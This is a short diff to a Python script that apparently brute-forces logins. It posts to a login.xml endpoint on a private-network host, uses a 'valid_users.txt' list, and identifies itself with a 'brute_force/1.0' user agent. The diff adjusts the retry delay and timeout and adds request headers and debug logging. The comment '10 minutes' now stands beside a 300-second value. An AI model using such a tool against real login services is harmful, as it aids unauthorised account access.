@@ -14,17 +14,28 @@ VALID_USERS_FILE = "valid_users.txt"
 BASE_URL = "http://172.21.0.1:8090"
 LOGIN_URL = f"{BASE_URL}/login.xml"
 LOGOUT_URL = f"{BASE_URL}/logout.xml"
-RETRY_DELAY_SEC = 600  # 10 minutes
-TIMEOUT_SEC = 2
+RETRY_DELAY_SEC = 300  # 10 minutes
+TIMEOUT_SEC = 10
 # ==========================================
 
 def send_post(url, data):
     try:
         data_encoded = urllib.parse.urlencode(data).encode('utf-8')
-        req = urllib.request.Request(url, data=data_encoded)
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (compatible; brute_force/1.0)',
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+        req = urllib.request.Request(url, data=data_encoded, headers=headers)
         with urllib.request.urlopen(req, timeout=TIMEOUT_SEC) as response:
-            return response.read().decode('utf-8')
-    except Exception:
+            try:
+                body = response.read().decode('utf-8')
+            except Exception:
+                body = ''
+            status_code = getattr(response, 'getcode', lambda: None)()
+            print(f"[DEBUG] HTTP {status_code} from {url}")
+            return body
+    except Exception as e:
+        print(f"[ERROR] Request to {url} failed: {repr(e)}")
         return None
 
 def logout(username):
